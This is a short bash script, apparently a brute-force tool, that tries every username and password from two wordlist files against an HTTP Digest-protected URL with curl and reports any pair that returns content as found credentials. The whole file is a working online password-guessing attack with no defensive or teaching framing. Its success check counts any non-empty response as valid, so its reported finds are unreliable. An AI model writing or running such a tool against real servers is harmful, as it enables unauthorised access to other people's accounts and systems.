#!/bin/bash
while read username; do
        while read password; do
                content=$(curl -s --digest -u $username:$password $1)
                if [ "$content" ]; then
                        echo "Found credentials Username: $username and Password: $password"
                else 
                        echo -ne "tried $username:$password"\\r
                fi
        done < $3
done < $2
